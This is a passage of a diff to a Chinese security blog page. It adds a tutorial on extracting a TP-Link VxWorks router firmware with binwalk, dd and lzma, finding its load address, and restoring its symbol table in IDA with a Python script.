+<h2 id="Vxworks固件解压及IDA修复过程-ghidra"><a href="#Vxworks固件解压及IDA修复过程-ghidra" class="headerlink" title="Vxworks固件解压及IDA修复过程(ghidra)"></a>Vxworks固件解压及IDA修复过程(ghidra)</h2><p>搞一个<code>TPLINK</code>的路由器，之前没搞过，跟普通的文件系统不太一样。但是网上的文章并不是很多，而且没有一个总结的非常清楚。这里记录一下，也不是非常清楚。</p>
+<p>TPlink基于<code>Vxworks</code>的路由器没有像<code>Linux</code>版本的根文件系统，整个系统就是一个大的bin文件，只要把bootloader加载到合适的位置就直接运行了。</p>
+<h3 id="使用Binwalk初步分析固件"><a href="#使用Binwalk初步分析固件" class="headerlink" title="使用Binwalk初步分析固件"></a>使用<code>Binwalk</code>初步分析固件</h3><p>先使用<code>binwalk</code>对文件进行扫描，看有没有什么敏感信息</p>
+<p><img src="http://file.smilehacker.net/image-20191105182511902.png" alt="image-20191105182511902"></p>
+<p>除了开头的<strong>uImage header</strong>之外其余全都是<code>LZMA</code>压缩之后的数据，但是注意红框内的数据，<code>Binwalk</code>显示出来的大小，一个为<code>-1</code>，另一个为<code>3580296</code>，这两个都不太寻常，我们先看大小为<code>3M</code>的这份数据，他比其他的<code>lzma</code>压缩之后的数据要大的多，其中有可能包含一些数据。我们直接用<code>binwalk</code>解压，尽量不要给自己找事(用<code>dd</code>解压)</p>
+<pre><code class="shell">binwalk -e firmware.bin
+
+# dd解压的方法
+dd if=firmware.bin of=10400.lzma skip=66560 bs=1 count=1241152 # 1307712-66560
+
+# lzma 解压
+lzma -d 10400.lzma</code></pre>
+<p>发现解压不出来。</p>
+<p><img src="http://file.smilehacker.net/image-20191106153809813.png" alt="image-20191106153809813"></p>
+<p>我们用winhex打开固件看看<code>0x13F440</code>处的到底是什么数据。</p>
+<p><img src="http://file.smilehacker.net/image-20191106153957693.png" alt="image-20191106153957693"></p>
+<p>这里看上去明显不像是数据的结尾。我们往上翻一翻。</p>
+<p><img src="http://file.smilehacker.net/image-20191106164741622.png" alt="image-20191106164741622"></p>
+<p><code>13E6F4</code>好像更像时数据的结尾，我们将数据复制出来，并用<code>lzma</code>解压</p>
+<pre><code class="shell">dd if=WDR_7660_V1.0_2.0.16_190325.bin of=10400.lzma skip=66560 bs=1 count=1237748
+
+lzma -d 10400.lzma</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191106165240644.png" alt="image-20191106165240644"></p>
+<p>这个跟<code>binwalk -e</code>解压出来的结果一摸一样。这里记录以下一个解压的过程。</p>
+<h3 id="使用IDA分析10400"><a href="#使用IDA分析10400" class="headerlink" title="使用IDA分析10400"></a>使用IDA分析10400</h3><p> 由于IDA Pro无法识别该文件，提示为”Binary file”，因此需要确定CPU的架构及加载基址。在”uImage header”部分已经有一些信息，如下，可以看到CPU架构为<code>arm</code>。 </p>
+<p><img src="http://file.smilehacker.net/image-20191106165829158.png" alt="image-20191106165829158"></p>
+<p> 在<code>uImage header</code>中有一个<code>Entry Point</code>地址<code>0x41C00000</code>，这个地址可能是<code>uBoo</code>t程序的加载基址，而不是<code>10400</code>文件的加载基址。采用该地址作为加载基址，虽然也能识别出<code>2000</code>多个函数，但在后续导入符号表时会对不上。 </p>
+<p>使用<code>Binwalk</code>识别程序是大端序还是小端序</p>
+<p><img src="http://file.smilehacker.net/image-20191106170029255.png" alt="image-20191106170029255"></p>
+<p>现在我们还是差一个入口地址，这个地址要怎么找到？</p>
+<h3 id="固件加载地址分析"><a href="#固件加载地址分析" class="headerlink" title="固件加载地址分析"></a>固件加载地址分析</h3><p>这里目前的文章并没有说清楚这个地址是怎么来的，给人更多的感觉像猜出来的。。但是能解决问题就行。我们使用<code>Winhex</code>加载固件后，来到地址<code>0x10400</code>，然后将数据往前翻，在不远处你会发现这个地址。两处地址同时指向<code>0x40205000</code>。</p>
+<p><img src="http://file.smilehacker.net/image-20191105182421398.png" alt="image-20191105182421398"></p>
+<p>这里还有一些其他的方法，参见：</p>
+<ul>
+<li><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a>  </li>
+<li><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></li>
+<li><a href="https://www.jianshu.com/p/12d8f509169c" target="_blank" rel="noopener">https://www.jianshu.com/p/12d8f509169c</a>  </li>
+</ul>
+<blockquote>
+<p>第一个跟第二个PDF将的差不多，都是同一个人写的，里面介绍了好几种方法,但是都不太适合我，因为10400导入IDA之后是大段乱码的，并没有识别出<code>UsrInit</code>函数，关于定位BSS清理函数在后期可以试一下</p>
+<p>第三篇文章将的其实也在PDF中有提到过，主要时利用内嵌符号表来分析加载地址。但是很不巧，我这里是一个外部的符号表，并不能直接拿来计算。</p>
+</blockquote>
+<p>IDA加载过程如下</p>
+<p>选择对应的架构平台，并设置加载地址</p>
+<p><img src="http://file.smilehacker.net/image-20191106173136394.png" alt="image-20191106173136394"></p>
+<p><img src="http://file.smilehacker.net/image-20191106173315351.png" alt="image-20191106173315351"></p>
+<p>加载成功后你会发现识别出来的函数很少,<code>Import</code>和<code>export</code>都是空的，而且。。没有符号表</p>
+<p><img src="http://file.smilehacker.net/image-20191106173426913.png" alt="image-20191106173426913"></p>
+<p>接下来我们就要城市修复符号表了</p>
+<h3 id="修复符号表"><a href="#修复符号表" class="headerlink" title="修复符号表"></a>修复符号表</h3><p> 使用<code>binwalk</code>直接提取该固件，在提取后的目录中搜索包含<code>VxWorks</code>中的某个关键函数如<code>bzero</code>的文件，如下 </p>
+<pre><code class="shell">grep -r bzero</code></pre>
+<p><img src="http://file.smilehacker.net/image-20191106173810837.png" alt="image-20191106173810837"></p>
+<p>发现<code>140B96</code>中发现了这个字符串，我们用strings查看下他内部的字符串</p>
+<p><img src="http://file.smilehacker.net/image-20191106175319206.png" alt="image-20191106175319206"></p>
+<p>可以看到有非常多的函数名，那他就是符号表无疑了。使用<code>hexdump</code>查看其内容,并计算字符串</p>
+<p><img src="http://file.smilehacker.net/image-20191106174558913.png" alt="image-20191106174558913"></p>
+<p>除了标记出来的，剩下的都是数据了，我们来计算一下符号名表的偏移。</p>
+<blockquote>
+<p>8(自身长度) + 8 (每组数据的长度) * 31ba(总共这么多个字符串)=18DD8</p>
+</blockquote>
+<p>之后使用hexdump查看下<code>18DD8</code>处的数据</p>
+<p><img src="http://file.smilehacker.net/image-20191106175050303.png" alt="image-20191106175050303"></p>
+<p>可以看到计算无误，正好是符号名表的开始。加下来使用如下IDA脚本批量导入符号表。</p>
+<pre><code class="python">import idautils
+import idc
+import idaapi
+
+symfile_path = &#39;./140B96&#39;    # 符号文件
+symbols_table_start = 8
+strings_table_start = 0x18DD8 # 字符串表偏移的地址
+
+with open(symfile_path, &#39;rb&#39;) as f:
+    symfile_contents = f.read()
+
+symbols_table = symfile_contents[symbols_table_start:strings_table_start]
+strings_table = symfile_contents[strings_table_start:]
+
+def get_string_by_offset(offset):
+    index = 0
+    while True:
+        if strings_table[offset+index] != &#39;\x00&#39;:
+            index += 1
+        else:
+            break
+    return strings_table[offset:offset+index]
+
+
+def get_symbols_metadata():
+    symbols = []
+    for offset in xrange(0, len(symbols_table),8):
+        symbol_item = symbols_table[offset:offset+8]
+        flag = symbol_item[0]
+        string_offset = int(symbol_item[1:4].encode(&#39;hex&#39;), 16)
+        string_name = get_string_by_offset(string_offset)
+        target_address = int(symbol_item[-4:].encode(&#39;hex&#39;), 16)
+        symbols.append((flag, string_name, target_address))
+    return symbols
+
+
+def add_symbols(symbols_meta_data):
+    for flag, string_name, target_address in symbols_meta_data:
+        idc.MakeName(target_address, string_name)
+        if flag == &#39;\x54&#39;:
+            idc.MakeCode(target_address)
+            idc.MakeFunction(target_address)
+
+
+if __name__ == &quot;__main__&quot;:
+    symbols_metadata = get_symbols_metadata()
+    add_symbols(symbols_metadata)</code></pre>
+<p>使用IDA运行此脚本，结果如下。</p>
+<p><img src="http://file.smilehacker.net/image-20191106175803536.png" alt="image-20191106175803536"></p>
+<p>识别出来了大部分函数以及近8000个函数</p>
+<h3 id="Ghidra-加载符号表"><a href="#Ghidra-加载符号表" class="headerlink" title="Ghidra 加载符号表"></a>Ghidra 加载符号表</h3><p>银河实验室开发了一个<code>vxhunter</code>，专门用于<code>vxworks</code>，但是测试了一下实际效果并不好。</p>
+<ul>
+<li>下载地址: <a href="https://github.com/PAGalaxyLab/vxhunter" target="_blank" rel="noopener">vxhunter</a></li>
+</ul>
+<p>只能字节写脚本了。这里不太方便放出。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><p><a href="http://zeroyu.xyz/2019/08/15/How_to_start_IoT_Reverse/" target="_blank" rel="noopener">http://zeroyu.xyz/2019/08/15/How_to_start_IoT_Reverse/</a>   </p>
+</li>
+<li><p>&lt;&lt;解密家用路由器0day挖掘技术&gt;&gt;</p>
+</li>
+<li><p><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-固件解析/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</a> </p>
+</li>
+<li><p><a href="https://www.freebuf.com/sectool/75915.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/75915.html</a> </p>
+</li>
+<li><p><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a> </p>
+</li>
+<li><p><a href="http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-路由器分析-固件初步分析/" target="_blank" rel="noopener">http://galaxylab.com.cn/0x00-tp-link-wr886nv7-v1-1-0-%e8%b7%af%e7%94%b1%e5%99%a8%e5%88%86%e6%9e%90-%e5%9b%ba%e4%bb%b6%e5%88%9d%e6%ad%a5%e5%88%86%e6%9e%90/</a> </p>
+</li>
+<li><p><a href="http://file.smilehacker.net/%E4%BD%BF%E7%94%A8Ghidra%E5%88%86%E6%9E%90VxWorks%E5%9B%BA%E4%BB%B6-%E6%9C%B1%E6%96%87%E5%93%B2-20190802.pdf" target="_blank" rel="noopener">使用Ghidra分析VxWorks固件-朱文哲-20190802.pdf</a></p>
+</li>
 </ul>
 
       
@@ -674,9 +713,11 @@ if __name__ == &#39;__main__&#39;:
       
         <div class="post-tags">
           
-            <a href="/tags/DNSRebind/" rel="tag"># DNSRebind</a>
+            <a href="/tags/IoT/" rel="tag"># IoT</a>
           
-            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" rel="tag"># 漏洞利用</a>
+            <a href="/tags/%E5%9B%BA%E4%BB%B6/" rel="tag"># 固件</a>
+          
+            <a href="/tags/%E5%88%86%E6%9E%90/" rel="tag"># 分析</a>
           
         </div>
       
@@ -689,8 +730,8 @@ if __name__ == &#39;__main__&#39;:
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/post/64819.html" rel="next" title="Linux PWN">
-                <i class="fa fa-chevron-left"></i> Linux PWN
+              <a href="/post/704fc7a0.html" rel="next" title="内网渗透 - 环境搭建">
+                <i class="fa fa-chevron-left"></i> 内网渗透 - 环境搭建
               </a>
             
           </div>
@@ -698,10 +739,6 @@ if __name__ == &#39;__main__&#39;:
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/post/35374.html" rel="prev" title="AFL Fuzzing study notes">
-                AFL Fuzzing study notes <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -888,7 +925,7 @@ if __name__ == &#39;__main__&#39;:
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-Rebind原理"><span class="nav-number">1.</span> <span class="nav-text">DNS_Rebind原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-Rebind攻击场景"><span class="nav-number">2.</span> <span class="nav-text">DNS_Rebind攻击场景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#TTL"><span class="nav-number">3.</span> <span class="nav-text">TTL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS请求过程"><span class="nav-number">4.</span> <span class="nav-text">DNS请求过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS缓存机制-巨坑！！"><span class="nav-number">5.</span> <span class="nav-text">DNS缓存机制 [巨坑！！]</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS查询过程"><span class="nav-number">6.</span> <span class="nav-text">DNS查询过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击演示"><span class="nav-number">7.</span> <span class="nav-text">攻击演示</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击展示图"><span class="nav-number">8.</span> <span class="nav-text">攻击展示图:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#参考链接"><span class="nav-number">9.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#固件"><span class="nav-number">1.</span> <span class="nav-text">固件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件系统"><span class="nav-number">2.</span> <span class="nav-text">文件系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#提取常用工具"><span class="nav-number">3.</span> <span class="nav-text">提取常用工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux自带工具"><span class="nav-number">3.1.</span> <span class="nav-text">Linux自带工具</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#第三方工具"><span class="nav-number">3.2.</span> <span class="nav-text">第三方工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手动解压固件"><span class="nav-number">4.</span> <span class="nav-text">手动解压固件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#手动判断文件类型"><span class="nav-number">4.1.</span> <span class="nav-text">手动判断文件类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#检索magic签名头"><span class="nav-number">4.1.1.</span> <span class="nav-text">检索magic签名头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#确定文件系统"><span class="nav-number">4.1.2.</span> <span class="nav-text">确定文件系统</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#手动提取固件"><span class="nav-number">4.2.</span> <span class="nav-text">手动提取固件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#自动解压固件"><span class="nav-number">5.</span> <span class="nav-text">自动解压固件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#扫描文件头"><span class="nav-number">5.1.</span> <span class="nav-text">扫描文件头</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Binwalk递归解压固件"><span class="nav-number">5.2.</span> <span class="nav-text">Binwalk递归解压固件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Binwalk识别大端序小端序"><span class="nav-number">5.3.</span> <span class="nav-text">Binwalk识别大端序小端序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Binwalk-熵值分析"><span class="nav-number">5.4.</span> <span class="nav-text">Binwalk 熵值分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Vxworks固件解压及IDA修复过程-ghidra"><span class="nav-number">6.</span> <span class="nav-text">Vxworks固件解压及IDA修复过程(ghidra)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Binwalk初步分析固件"><span class="nav-number">6.1.</span> <span class="nav-text">使用Binwalk初步分析固件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用IDA分析10400"><span class="nav-number">6.2.</span> <span class="nav-text">使用IDA分析10400</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#固件加载地址分析"><span class="nav-number">6.3.</span> <span class="nav-text">固件加载地址分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复符号表"><span class="nav-number">6.4.</span> <span class="nav-text">修复符号表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Ghidra-加载符号表"><span class="nav-number">6.5.</span> <span class="nav-text">Ghidra 加载符号表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
             
 
           </div>
@@ -1067,9 +1104,9 @@ if __name__ == &#39;__main__&#39;:
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'https://blog.pwntools.xyz/post/15454.html';
-          this.page.identifier = 'post/15454.html';
-          this.page.title = 'DNSRebind测试笔记';
+          this.page.url = 'https://blog.pwntools.xyz/post/7dc2b2.html';
+          this.page.identifier = 'post/7dc2b2.html';
+          this.page.title = '固件解压分析工具及方法整理';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://blog-rvy0h9n8wm.disqus.com/embed.js';
